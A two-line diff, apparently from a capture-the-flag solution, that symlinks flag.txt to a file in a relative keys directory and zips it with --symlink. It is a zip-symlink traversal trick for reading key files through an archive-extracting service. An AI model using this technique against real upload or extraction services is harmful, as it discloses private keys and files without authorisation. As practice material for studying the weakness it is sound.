@@ -1,0 +1,2 @@
+ln -s ../../keys/keys_c111e2209dcd275ff9ac418118155647 flag.txt
+zip --symlink flag.zip flag.txt
